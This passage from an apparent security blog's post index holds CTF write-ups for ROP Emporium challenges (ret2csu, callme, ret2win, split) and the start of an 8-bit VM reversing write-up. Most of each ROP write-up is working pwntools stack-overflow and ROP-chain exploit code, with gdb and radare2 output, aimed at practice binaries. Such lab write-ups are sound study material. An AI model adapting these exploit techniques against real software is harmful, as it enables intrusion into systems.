5d                \tpop    r13  4006a0:\t41 5e                \tpop    r14  4006a2:\t41 5f                \tpop    r15  4006a4:\tc3                   \tretFor the second stage, we need to look for the gadgets that will enable us to control the RDI, RSI and RDX registers in that order. This is because of x86_64 calling convention, the first three arguments to a function are passed in RDI, RSI and RDX registers respectively. From the disassembly of __libc_csu_init we can get our second gadget to build our rop chain.mov    rdx,r15mov    rsi,r14mov    edi,r13dcall   QWORD PTR [r12+rbx*8]From the above code, we are now able to control the rdx, rsi and edi registers.The call in the second stage gadgets, calculates the destination address of our code.Because we have all the gadgets we need to build our rop chain. From the authors website, the challenge is very similar to ret2win challenge.  This challenge is very similar to “callme”, with the exception of the useful gadgets. Simply call the ret2win() function in the accompanying library with same arguments that you used to beat the “callme” challenge (ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d) for the ARM &amp; MIPS binaries, ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) for the x86_64 binary.From the description, we want to pass three arguments to ret2win function. The arguments will be passed to rdi, rsi and rdx respectively. Because we don`t control the these registers directly, we need to set these arguments in the first rop chain that will enable us to control the rdi, rsi and rdx in the second gadget.rdi &lt;-- r13 &lt;--  #first args   0xdeadbeefdeadbeefrsi &lt;-- r14 &lt;--  #second args  0xcafebabecafebaberdx &lt;-- r15 &lt;--  #third args   0xd00df00dd00df00dFrom code snip above, we can control the registers values as shown in the code above. For debugging our exploit we will use python3 and gdb to ensure that there is no unexpected behavior which may cause crashes.Set a breakpoint in our first address of the ropchain gadget, and run binary with the generated payload.(gdb) break *0x000000000040069aBreakpoint 1 at 0x40069a(gdb) r &lt;/tmp/payloadStarting program: /home/vx/Downloads/rop/rop/ret2csu/ret2csu &lt;/tmp/payloadBreakpoint 1, 0x000000000040069a in __libc_csu_init ()(gdb) cContinuing.ret2csu by ROP Emporiumx86_64Breakpoint 1, 0x000000000040069a in __libc_csu_init ()(gdb)When the program is run,it hits the set breakpoint. Type c command for paused process to continue the execution. When the program finishes the execution, the return address now points back to the address of our first gadget, Because of breakpoint, the execution stops. We can inspect the memory to understand the behavior of the program and values loaded in the registers.(gdb) x/10i $rip=&gt; 0x40069a &lt;__libc_csu_init+90&gt;:\tpop    rbx   0x40069b &lt;__libc_csu_init+91&gt;:\tpop    rbp   0x40069c &lt;__libc_csu_init+92&gt;:\tpop    r12   0x40069e &lt;__libc_csu_init+94&gt;:\tpop    r13   0x4006a0 &lt;__libc_csu_init+96&gt;:\tpop    r14   0x4006a2 &lt;__libc_csu_init+98&gt;:\tpop    r15   0x4006a4 &lt;__libc_csu_init+100&gt;:\tret   0x4006a5:\tnop   0x4006a6:\tnop    WORD PTR cs:[rax+rax*1+0x0]   0x4006b0 &lt;__libc_csu_fini&gt;:\trepz retNow we can Single step in the debugger and view the values stored in the registers of our gadget. The command for single stepping in gdb is si.(gdb) i r rbx rbp r12 r13 r14 r15rbx            0x4343434343434343  4846791580151137091rbp            0x4242424242424242  0x4242424242424242r12            0x4141414141414141  4702111234474983745r13            0xdeadbeefdeadbeef  -2401053088876216593r14            0xcafebabecafebabe  -3819410105351357762r15            0xd00df00dd00df00d  -3454841397007486963(gdb)From assembly code code above we are able to control all the register value in our chain using our generated payload file. The code for generating the payload is shown below.import pwnpop_gadget = pwn.p64(0x0040069a)payload =b\"A\"*32 #fill the bufferpayload +=b\"B\"*8 #rbp(saved)payload += pop_gadget  #retaddrpayload += pwn.p64(0x4343434343434343)#rbxpayload += pwn.p64(0x4242424242424242)#rbppayload += pwn.p64(0x4141414141414141) #r12payload += pwn.p64(0xdeadbeefdeadbeef) #r13payload += pwn.p64(0xcafebabecafebabe) #r14payload += pwn.p64(0xd00df00dd00df00d) #r15open('payload', 'wb').write(payload)Next step is determining the correct or desired values for rbx, rbp and r12 registers because 0x41…, 0x42…., 0x43… are not valid memory addresses.For execution of second rop gadget chain, we need to set right values of rbp and rbx due to a loop conditional.   0x0000000000400680 &lt;+64&gt;:\tmov    rdx,r15   0x0000000000400683 &lt;+67&gt;:\tmov    rsi,r14   0x0000000000400686 &lt;+70&gt;:\tmov    edi,r13d   0x0000000000400689 &lt;+73&gt;:\tcall   QWORD PTR [r12+rbx*8]   0x000000000040068d &lt;+77&gt;:\tadd    rbx,0x1   0x0000000000400691 &lt;+81&gt;:\tcmp    rbp,rbx   0x0000000000400694 &lt;+84&gt;:\tjne    0x400680 &lt;__libc_csu_init+64&gt;   0x0000000000400696 &lt;+86&gt;:\tadd    rsp,0x8Second gadget starts at 0x0000000000400680,in which we are set values of rdi,r14 and rdx with correct argument values. Set values of rbx and rbp correctly so that conditional cmp is always true. Because of add instruction of 1 to rbx, rbx value needs to be 0 and rbp value to 1. when the registers are compared, the values are equal and Zero flag is set.NB: “Adjust values in payload script and single step to confirm the validity of new values in the memory.”For register r12, the address should lie in executable memory address. The .bss section is executable, therefore r12 should be set to memory address of bss section. After executing our second rop chain gadget, we need to adjust the stack as shown in the exploit code to avoid segmentation fault.Lastly we need to control the rdi register with the value 0xdeadbeefdeadbeef. Because we have full control of rdx and rsi register, next is to look for a pop rdi, ret gadget.  0x004006a3                 5f  pop rdi  0x004006a4                 c3  retNow we can pass the 0xdeadbeefdeadbeef argument to the ret2win function.Now we have all the correct values of rdi, rsi and rdx correctly set, calling the ret2win function will result to us getting the correct flag.The full code of the rop chain is as shown below.import pwnpwn.context.encoding = \"latin-1\"pwn.warnings.simplefilter(\"ignore\")pwn.context.arch = \"amd64\"io = pwn.process('./ret2csu')#arguments passed to ret2win function ret2win(arg1, arg2, arg3)arg1 =pwn.p64(0xdeadbeefdeadbeef)arg2 =pwn.p64(0xcafebabecafebabe)arg3 =pwn.p64(0xd00df00dd00df00d)ret2win_addr =pwn.p64(io.elf.plt['ret2win'])   #resolve address of ret2win functionpop_rbx_rbp_r12_r13_r14_r15_addr = pwn.p64(0x0040069a)  #first stage gadgetdereference_pointer = pwn.p64(0x00600e48)  #bss area which is executablestage2_addr = pwn.p64(0x00400680)  #addr of second stage rop chainpop_rdi = pwn.p64(0x004006a3)# ropchains#stage1 ropchain'''            0x0040069a      pop   rbx│           0x0040069b      pop   rbp│           0x0040069c      pop   r12│           0x0040069e      pop   r13│           0x004006a0      pop   r14│           0x004006a2      pop   r15└           0x004006a4      ret'''#Determine the loop values for conditional branch'''╎│          0x00400689      call  qword [r12 + rbx*8]│      ╎│   0x0040068d      add   rbx, 1│      ╎│   0x00400691      cmp   rbp, rbx│      └──&lt; 0x00400694      jne   0x400680'''stage1 = pop_rbx_rbp_r12_r13_r14_r15_addrstage1 += pwn.p64(0)   #set RBP=0stage1 += pwn.p64(1)   #set RBX=1stage1 += dereference_pointer #set R12stage1 += arg1   #R13stage1 += arg2   #R14stage1 += arg3   #R15stage1 += stage2_addrstage1 += pwn.p64(0)*7   #adjust the stack#stage2'''   ┌──&gt;     0x00400680      mov   rdx, r15│      ╎│   0x00400683      mov   rsi, r14│      ╎│   0x00400686      mov   edi, r13d│      ╎│   0x00400689      call  qword [r12 + rbx*8]'''stage2 = pop_rdistage2 +=arg1stage2 +=ret2win_addrpayload = b\"A\"*32payload += b\"B\"*8payload += b\"\" .join([    stage1,    stage2    ])io.writeafter('&gt;', payload)pwn.info(io.recvall().decode())Running the code above we get correct flagvx@archie:ret2csu$ python3 xpl.py[+] Starting local process './ret2csu': pid 18869    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    RUNPATH:  b'.'[+] Receiving all data: Done (45B)[*] Process './ret2csu' stopped with exit code 0 (pid 18869)[*]  Thank you!    ROPE{a_placeholder_32byte_flag!}References   Universal ROP or Return-to-csu  Linux program startup"
  },
  
  {
    "title": "Ropemporium callme challenge",
    "url": "/posts/ropemporium-callme/",
    "categories": "malware",
    "tags": "ctf, ropemporium",
    "date": "2021-12-20 21:08:00 +0300",
    





    "snippet": "IntroductionChallenge DescriptionThe goal of the challenge is understanding how more than one argument is passed in x64 function. The challenge can be downloaded from the author`s website ropemporium  Reliably make consecutive calls to imported functions.Use some new techniques and learn about the Procedure Linkage Table.The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.  You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)check the binary protections enabled on the callme binary, only NX( Not Executable) is enabled on the binary as shown below.vx@archie:callme$ checksec --file callme    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)    RUNPATH:  b'.'Open callme binary in radare2 to look for exploitable vulnerability and examine the behavior. radare2 is a powerful disassembler/debugging tool used for examining the behavior of programs.From the above image we use pdf command to disassemble a given function. Function pwnme looks similar to the previous challenges ret2win and split.From the aDisassembled program, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.Next function is read function, which reads for user input and stores in the allocated buffer.ssize_t read(int fd, void *buf, size_t count);From assembly code, we are reading 0x200 bytes from the standard input file descriptor and storing it in buffer, meaning we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.For exploitation stack overflow, fill the buffer, overwrite rbp register and control the return address with desired address.Because the system function receives one argument, look for one gadgets that we control the rdi, rsi and rdx registers.What are gadgets?Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.The example of the pop rdi,pop rsi,pop rdx, ret gadget is shown in image below.Next is determine addresses of callme_one, callme_two, callme_three functions using gdb.(gdb) info functionsAll defined functions:Non-debugging symbols:0x00000000004006a8  _init0x00000000004006d0  puts@plt0x00000000004006e0  printf@plt0x00000000004006f0  callme_three@plt0x0000000000400700  memset@plt0x0000000000400710  read@plt0x0000000000400720  callme_one@plt0x0000000000400730  setvbuf@plt0x0000000000400740  callme_two@plt0x0000000000400750  exit@plt0x0000000000400760  _start0x0000000000400790  _dl_relocate_static_pie0x00000000004007a0  deregister_tm_clones0x00000000004007d0  register_tm_clones0x0000000000400810  __do_global_dtors_aux0x0000000000400840  frame_dummy0x0000000000400847  main0x0000000000400898  pwnme0x00000000004008f2  usefulFunction0x000000000040093c  usefulGadgets0x0000000000400940  __libc_csu_init0x00000000004009b0  __libc_csu_fini0x00000000004009b4  _fini(gdb)Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the callme binary does PLT relocations of the functions of callme, disassemble the target shared library libcallme.so as shown below.vx@archie:callme$ gdb -q libcallme.soReading symbols from libcallme.so...(No debugging symbols found in libcallme.so)(gdb) disas callme_oneDump of assembler code for function callme_one:   0x000000000000081a &lt;+0&gt;:\tpush   rbp   0x000000000000081b &lt;+1&gt;:\tmov    rbp,rsp   0x000000000000081e &lt;+4&gt;:\tsub    rsp,0x30   0x0000000000000822 &lt;+8&gt;:\tmov    QWORD PTR [rbp-0x18],rdi   0x0000000000000826 &lt;+12&gt;:\tmov    QWORD PTR [rbp-0x20],rsi   0x000000000000082a &lt;+16&gt;:\tmov    QWORD PTR [rbp-0x28],rdx   0x000000000000082e &lt;+20&gt;:\tmovabs rax,0xdeadbeefdeadbeef   0x0000000000000838 &lt;+30&gt;:\tcmp    QWORD PTR [rbp-0x18],rax   0x000000000000083c &lt;+34&gt;:\tjne    0x912 &lt;callme_one+248&gt;   0x0000000000000842 &lt;+40&gt;:\tmovabs rax,0xcafebabecafebabe   0x000000000000084c &lt;+50&gt;:\tcmp    QWORD PTR [rbp-0x20],rax   0x0000000000000850 &lt;+54&gt;:\tjne    0x912 &lt;callme_one+248&gt;   0x0000000000000856 &lt;+60&gt;:\tmovabs rax,0xd00df00dd00df00d   0x0000000000000860 &lt;+70&gt;:\tcmp    QWORD PTR [rbp-0x28],rax   0x0000000000000864 &lt;+74&gt;:\tjne    0x912 &lt;callme_one+248&gt;   0x000000000000086a &lt;+80&gt;:\tmov    QWORD PTR [rbp-0x8],0x0   0x0000000000000872 &lt;+88&gt;:\tlea    rsi,[rip+0x32f]        # 0xba8   0x0000000000000879 &lt;+95&gt;:\tlea    rdi,[rip+0x32a]        # 0xbaa   0x0000000000000912 &lt;+248&gt;:\tlea    rdi,[rip+0x301]        # 0xc1a   0x0000000000000919 &lt;+255&gt;:\tcall   0x6c0 &lt;puts@plt&gt;   0x000000000000091e &lt;+260&gt;:\tmov    edi,0x1   0x0000000000000923 &lt;+265&gt;:\tcall   0x720 &lt;exit@plt&gt;   0x0000000000000928 &lt;+270&gt;:\tnop   0x0000000000000929 &lt;+271&gt;:\tleave   0x000000000000092a &lt;+272&gt;:\tretEnd of assembler dump.(gdb)From the disassembly code above, the function compares the arguments passed to the callme_one function. If string values are not equal to values passed to the rdi, rsi and rdx registers the program exits, otherwise we get a flag.From previous knowledge of solving other challenges, we need to overwrite the return address with controlled pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.Fully working rop chain code.import pwn#Various setting for pwntoolspwn.context.encoding = \"latin-1\"pwn.warnings.simplefilter(\"ignore\")pwn.context.arch = \"amd64\"io = pwn.process('./callme')pop_rdi_rsi_rdx = pwn.p64(0x0040093c)  #pop rdi; pop rsi; pop rdx; ret gadgetarg1 = pwn.p64(0xdeadbeefdeadbeef)arg2 = pwn.p64(0xcafebabecafebabe)arg3 = pwn.p64(0xd00df00dd00df00d)callme_one_addr = pwn.p64(0x0000000000400720)callme_two_addr = pwn.p64(0x0000000000400740)callme_three_addr =pwn.p64(0x00000000004006f0)#call the callme_one functioncallme_one = pop_rdi_rsi_rdxcallme_one += arg1callme_one += arg2callme_one += arg3callme_one += callme_one_addr#callme_two functioncallme_two = pop_rdi_rsi_rdxcallme_two += arg1callme_two += arg2callme_two  += arg3callme_two += callme_two_addr#callme_three functioncallme_three = pop_rdi_rsi_rdxcallme_three += arg1callme_three += arg2callme_three += arg3callme_three += callme_three_addrpayload = b\"A\" *32   #fill the bufferpayload += b\"B\" * 8  #overwrite the rbppayload += callme_onepayload += callme_twopayload += callme_threeio.writeafter('&gt;', payload)pwn.info(io.clean().decode())Successful execution of the above code, correct flag is printed."
  },
  
  {
    "title": "Ropemporium Ret2win challenge",
    "url": "/posts/ropemporium-ret2win/",
    "categories": "ropemporium",
    "tags": "ctf, ropemporium",
    "date": "2021-12-20 21:07:00 +0300",
    





    "snippet": "  Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.The binaries for the challenges can be downloaded from the author`s website ropemporium.The goal of first challenge is to call the ret2win function.After downloading the binary, the first is to check binary protection enabled on the binary using checksec utility.vx@archie:ret2win$ checksec --file ret2win    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)Only NX (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like shellcode. Toe analyze the behavior of the program we will use gdb. gdb is a tool that enables one to inspect the behavior of binaries at runtime.(gdb) info functionsAll defined functions:Non-debugging symbols:0x0000000000400528  _init0x0000000000400550  puts@plt0x0000000000400560  system@plt0x0000000000400570  printf@plt0x0000000000400580  memset@plt0x0000000000400590  read@plt0x00000000004005a0  setvbuf@plt0x00000000004005b0  _start0x00000000004005e0  _dl_relocate_static_pie0x00000000004005f0  deregister_tm_clones0x0000000000400620  register_tm_clones0x0000000000400660  __do_global_dtors_aux0x0000000000400690  frame_dummy0x0000000000400697  main0x00000000004006e8  pwnme0x0000000000400756  ret2win0x0000000000400780  __libc_csu_init0x00000000004007f0  __libc_csu_fini0x00000000004007f4  _fini(gdb)The binary has various functions has as shown in the output above.For initial analysis we start at the main function which is the entrypoint of our program.(No debugging symbols found in ret2win)(gdb) disas mainDump of assembler code for function main:   0x0000000000400697 &lt;+0&gt;:\tpush   rbp   0x0000000000400698 &lt;+1&gt;:\tmov    rbp,rsp   0x000000000040069b &lt;+4&gt;:\tmov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 &lt;stdout@@GLIBC_2.2.5&gt;   0x00000000004006a2 &lt;+11&gt;:\tmov    ecx,0x0   0x00000000004006a7 &lt;+16&gt;:\tmov    edx,0x2   0x00000000004006ac &lt;+21&gt;:\tmov    esi,0x0   0x00000000004006b1 &lt;+26&gt;:\tmov    rdi,rax   0x00000000004006b4 &lt;+29&gt;:\tcall   0x4005a0 &lt;setvbuf@plt&gt;   0x00000000004006b9 &lt;+34&gt;:\tmov    edi,0x400808   0x00000000004006be &lt;+39&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x00000000004006c3 &lt;+44&gt;:\tmov    edi,0x400820   0x00000000004006c8 &lt;+49&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x00000000004006cd &lt;+54&gt;:\tmov    eax,0x0   0x00000000004006d2 &lt;+59&gt;:\tcall   0x4006e8 &lt;pwnme&gt;   0x00000000004006d7 &lt;+64&gt;:\tmov    edi,0x400828   0x00000000004006dc &lt;+69&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x00000000004006e1 &lt;+74&gt;:\tmov    eax,0x0   0x00000000004006e6 &lt;+79&gt;:\tpop    rbp   0x00000000004006e7 &lt;+80&gt;:\tretEnd of assembler dump.(gdb)From the initial analysis of the main function,main call an interesting function called pwnme. Next is to disassemble pwnme function to understand the behavior.(gdb) disas pwnmeDump of assembler code for function pwnme:   0x00000000004006e8 &lt;+0&gt;:\tpush   rbp   0x00000000004006e9 &lt;+1&gt;:\tmov    rbp,rsp   0x00000000004006ec &lt;+4&gt;:\tsub    rsp,0x20   0x00000000004006f0 &lt;+8&gt;:\tlea    rax,[rbp-0x20]   0x00000000004006f4 &lt;+12&gt;:\tmov    edx,0x20   0x00000000004006f9 &lt;+17&gt;:\tmov    esi,0x0   0x00000000004006fe &lt;+22&gt;:\tmov    rdi,rax   0x0000000000400701 &lt;+25&gt;:\tcall   0x400580 &lt;memset@plt&gt;   0x0000000000400706 &lt;+30&gt;:\tmov    edi,0x400838   0x000000000040070b &lt;+35&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x0000000000400710 &lt;+40&gt;:\tmov    edi,0x400898   0x0000000000400715 &lt;+45&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x000000000040071a &lt;+50&gt;:\tmov    edi,0x4008b8   0x000000000040071f &lt;+55&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x0000000000400724 &lt;+60&gt;:\tmov    edi,0x400918   0x0000000000400729 &lt;+65&gt;:\tmov    eax,0x0   0x000000000040072e &lt;+70&gt;:\tcall   0x400570 &lt;printf@plt&gt;   0x0000000000400733 &lt;+75&gt;:\tlea    rax,[rbp-0x20]   0x0000000000400737 &lt;+79&gt;:\tmov    edx,0x38   0x000000000040073c &lt;+84&gt;:\tmov    rsi,rax   0x000000000040073f &lt;+87&gt;:\tmov    edi,0x0   0x0000000000400744 &lt;+92&gt;:\tcall   0x400590 &lt;read@plt&gt;   0x0000000000400749 &lt;+97&gt;:\tmov    edi,0x40091b   0x000000000040074e &lt;+102&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x0000000000400753 &lt;+107&gt;:\tnop   0x0000000000400754 &lt;+108&gt;:\tleave   0x0000000000400755 &lt;+109&gt;:\tretEnd of assembler dump.From analysis of the above assembly code, we fill a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values present memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.Next function is read function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we are reading 0x38 bytes from the user input and storing it in our buffer.read(0, *[rbp-0x20], 0x38) //0 is file descriptor stdinBecause we are reading more than what the buffer can hold, we corrupt the adjacent memory regions therefore causing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image above is to fill the buffer, overwrite the rbp register and control the return address with ret2win function address.The exploit code for this ret2win function is,import pwnpwn.context.encoding = \"latin-1\"pwn.warnings.simplefilter(\"ignore\")pwn.context.arch = \"amd64\"io = pwn.process('./ret2win')payload = b\"A\" * 32 # fill the bufferpayload += b\"B\" * 8  #overwrite saved base pointerpayload += pwn.p64(0x400756)  #Address of ret2win functionio.writeafter('&gt;', payload)pwn.info(io.clean().decode())Running the above script we get correct flag.vx@archie:ret2win$ python3 x.py[+] Starting local process './ret2win': pid 45427[*]  Thank you!    Well done! Here's your flag:    ROPE{a_placeholder_32byte_flag!}[*] Process './ret2win' stopped with exit code 0 (pid 45427)"
  },
  
  {
    "title": "Ropemporium split challenge",
    "url": "/posts/ropemporium-split/",
    "categories": "ropemporium",
    "tags": "ctf, ropemporium",
    "date": "2021-12-17 21:07:00 +0300",
    





    "snippet": "The elements that allowed you to complete ret2win are still present, they’ve just been split apart. Find them and recombine them using a short ROP chainThe goal of this challenge is to understand how function arguments are passed in 64bit machine when doing return oriented programming. The binary can be downloaded from the authors website ropemporium.First we check the binary protections enabled. Only NX (Not executable) is enabled on the device according to checksec binary utility as shown in the image below.vx@archie:split$ checksec --file=split    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)For analysis of binary we use gdb to analyze the functions present in the binary in order to understand the logic. We disassemble pwnme function as shown in the image below.The function looks familiar as for the ret2win function.(gdb) disas pwnmeDump of assembler code for function pwnme:   0x00000000004006e8 &lt;+0&gt;:\tpush   rbp   0x00000000004006e9 &lt;+1&gt;:\tmov    rbp,rsp   0x00000000004006ec &lt;+4&gt;:\tsub    rsp,0x20   0x00000000004006f0 &lt;+8&gt;:\tlea    rax,[rbp-0x20]   0x00000000004006f4 &lt;+12&gt;:\tmov    edx,0x20   0x00000000004006f9 &lt;+17&gt;:\tmov    esi,0x0   0x00000000004006fe &lt;+22&gt;:\tmov    rdi,rax   0x0000000000400701 &lt;+25&gt;:\tcall   0x400580 &lt;memset@plt&gt;   0x0000000000400706 &lt;+30&gt;:\tmov    edi,0x400810   0x000000000040070b &lt;+35&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x0000000000400710 &lt;+40&gt;:\tmov    edi,0x40083c   0x0000000000400715 &lt;+45&gt;:\tmov    eax,0x0   0x000000000040071a &lt;+50&gt;:\tcall   0x400570 &lt;printf@plt&gt;   0x000000000040071f &lt;+55&gt;:\tlea    rax,[rbp-0x20]   0x0000000000400723 &lt;+59&gt;:\tmov    edx,0x60   0x0000000000400728 &lt;+64&gt;:\tmov    rsi,rax   0x000000000040072b &lt;+67&gt;:\tmov    edi,0x0   0x0000000000400730 &lt;+72&gt;:\tcall   0x400590 &lt;read@plt&gt;   0x0000000000400735 &lt;+77&gt;:\tmov    edi,0x40083f   0x000000000040073a &lt;+82&gt;:\tcall   0x400550 &lt;puts@plt&gt;   0x000000000040073f &lt;+87&gt;:\tnop   0x0000000000400740 &lt;+88&gt;:\tleave   0x0000000000400741 &lt;+89&gt;:\tretEnd of assembler dump.(gdb)From the above code, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory region we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the boundary of base pointer address in the stack.Next function is read function, which reads for user input from the standard input file descriptor and stores in specified buffer. From disassembled code, we are reading 0x60 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to stack buffer overflow.ssize_t read(int fd, void *buf, size_t count);For this challenge we don’t have a ret2win function which we are to return to. From the disassembly of the binary we have an interesting function called usefulFunction responsible for listing the files in the directory when called.(gdb) disas usefulFunctionDump of assembler code for function usefulFunction:   0x0000000000400742 &lt;+0&gt;:\tpush   rbp   0x0000000000400743 &lt;+1&gt;:\tmov    rbp,rsp   0x0000000000400746 &lt;+4&gt;:\tmov    edi,0x40084a   0x000000000040074b &lt;+9&gt;:\tcall   0x400560 &lt;system@plt&gt;   0x0000000000400750 &lt;+14&gt;:\tnop   0x0000000000400751 &lt;+15&gt;:\tpop    rbp   0x0000000000400752 &lt;+16&gt;:\tretEnd of assembler dump.(gdb) x/s 0x40084a0x40084a:\t\"/bin/ls\"(gdb)Goal is to pass a different string to the system function instead of “/bin/ls”From the author’s hint, we can look for useful hints in the binary using either radare2.  Now that you’ve gathered the elements of your exploit you can start to piece them together, you want to call system() with the “/bin/cat flag.txt” string as the only argument. You’ll also have to start dealing with the differences between the various architectures’ calling conventions.Analyzing binary using radare2, we can use iz command to look for strings. The goal is to read the flag from the system.[0x004005b0]&gt; iznth paddr      vaddr      len size section type  string---------------------------------------------------------------------------------------------0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\\n2   0x00000806 0x00400806 8   9    .rodata ascii \\nExiting3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txtWe have an important string “/bin/cat flag.txt” which will enable us to complete our goal. Now we need pass string to system function as follows system(‘/bin/cat flag.txt’).For building ropchain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order RDI, RSI, RDX, RCX, R8 and R9.Because the system function receives one argument, we need to look for one gadget t that we control rdi address.What are gadgets?Gadgets are sequence of instructions that end with ret instruction. Because we want to load a value into rdi register, we look for a pop pop rdi; ret instruction in order to pass an argument to system.For searching gadget in radare2/rizin, use /R command as shown in the image below.Now we need to chain ropchain exploit as shown in the image below.The goal is to overwrite the return address with the address of “pop rdi, ret “ and call system function. we need to fill the buffer memory with 32bytes, 8 bytes to overwrite the rbp address and 8 bytes to overwrite return address with pop rdi address.Full exploit of split challenge is;import pwnpwn.context.encoding = \"latin-1\"pwn.warnings.simplefilter(\"ignore\")pwn.context.arch = \"amd64\"io = pwn.process(\"./split\")system_addr = pwn.p64(0x400560)   #address of systempop_rdi_ret = pwn.p64(0x004007c3)  # pop rdi; ret gadgetbin_cat_addr = pwn.p64(0x00601060)  #bin cat flag.txt addresspayload = b\"A\" * 32  #fill the bufferpayload += b\"B\" *8   # overwrite  rbppayload += pop_rdi_ret # pop rdi gadgetpayload += bin_cat_addr # argument passed to the system functionpayload += system_addr   #call systemio.writeafter('&gt;', payload)pwn.info(io.clean().decode())Running python3 code we get a flag.  To avoid the segmentation fault of the above, we can overwrite the rbp address with exit function address in order to exit without segfault."
  },
  
  {
    "title": "Reversing a 8-bit VM",
    "url": "/posts/reversing-vm/",
    "categories": "reverse",
    "tags": "ctf, reverse",
    "date": "2021-12-07 21:07:00 +0300",
    





    "snippet": "vm1.exe implements a simple 8-bit virtual machine (VM) to try and stop reverse engineers from retrieving the flag. The VM`s RAM contains the encrypted flag and some bytecode to decrypt it. Can you figure out how the VM works and write your own to decrypt the flag?. A copy of the VM’s RAM has been provided in ram.bin (this data is identical to the ram content of the malware’s VM before execution and contains both the custom assembly code and encrypted flag).Main function analysisFrom the main function, HeapAlloc allocates a memory block of size 0x1FB bytes. The pointer of the allocated memory block is called allocated_memblock as shown in the image.The program does a memcpy of the content stored in the rambin offset to newly allocated memory block.void *memcpy(void *dest,const void *src, size_t count);memcpy function copies data from the source address to destination address of size 0x1fb. The destination address of this program is allocate_memblock. The content of the rambin file and content at the rambin offset are the same as examined below.Next step is analyzing sub_4022E0 function. The disassembled function graph looks like the one below.From the disassembly above, the binary does some byte operations. The first graph block is doing a bitwise AND operation, which is responsible for setting both SF and ZF to zero.First it sets the value of eax register to 1, and then do a test operation. Because the conditional “jump if zero” is not true, we continue our execution to the next control block.For decompilation of our binary we use ghidra.int FUN_004022e0(void){  byte bVar1;  uint uVar2;  byte bVar3;  byte counter;  counter = 0;  do {    /* 0 */    uVar2 = (uint)counter;      /* 2 */    bVar1 = counter + 1;    bVar3 = counter + 2;    counter = counter + 3;    uVar2 = FUN_00402270((uint)*(byte *)(allocated_memblock + 0xff + uVar2),                         (uint)*(byte *)(allocated_memblock + 0xff + (uint)bVar1),                         (uint)*(byte *)(allocated_memblock + 0xff + (uint)bVar3));  } while ((uVar2 &amp; 0xff) != 0);  return uVar2;}The above c-code like is more easier to understand.The assembly equivalent of this operation is as the one shown in the first memory block of the function.loc_4022EA:mov     eax, 1test    eax, eaxjz      short loc_402367Function FUN_00402270 is called and three arguments are passed as parameters.The control graph below shows various operation executed by the binary depending on the argument passed to the function.From the above graph, the function does a compare on the arguments passed with either 1, 2 or 3. If the condition is fulfilled, that operation branch is executed as shown in the image above.Example: if the argument value passed is 1, control flow branch to loc_4022E address as shown in the graphFor better understanding of the control flow, we decompile the function using ghidra, because idafree does not support x86 decompilation.The “C-like style” of the code looks like the one below.int FUN_00402270(int value1,int value2,int param_3){  if (value1 == 1) {    *(undefined *)(allocated_memblock + value2) = (undefined)param_3;  }  else {    if (value1 == 2) {      value1 = allocated_memblock + value2;      DAT_00404240 = *(byte *)value1;    }    else {      if (value1 != 3) {        return value1 &amp; 0xffffff00;      }      value1 = allocated_memblock + value2;      *(byte *)(allocated_memblock + value2) = *(byte *)value1 ^ DAT_00404240;    }  }  return CONCAT31((int3)((uint)value1 &gt;&gt; 8),1);}Decompilation of ghidra is not optimal, therefore decompiled code contains some cast which can be fixed by setting correct data types in the functional signatures. Being an easy VM, we implement the logic in python for decryption of contents ram.bin file.Fully implemented solution code is below.#implement decryption routine function in python#solution.pydef fun_00402270(value1, 